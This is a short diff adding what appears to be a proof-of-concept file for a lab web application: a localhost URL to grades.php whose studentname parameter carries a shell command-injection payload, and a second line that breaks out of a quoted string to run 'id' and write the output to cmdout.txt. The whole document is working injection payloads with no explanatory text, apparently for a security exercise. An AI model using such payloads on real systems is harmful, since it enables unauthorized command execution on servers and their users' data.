@@ -1,0 +1,4 @@
+http://localhost:30000/grades.php?courseid=3&studentname=Laksh%22;id;%22&quizid=quiz1
+
+
+" ;id > ./cmdout.txt; "
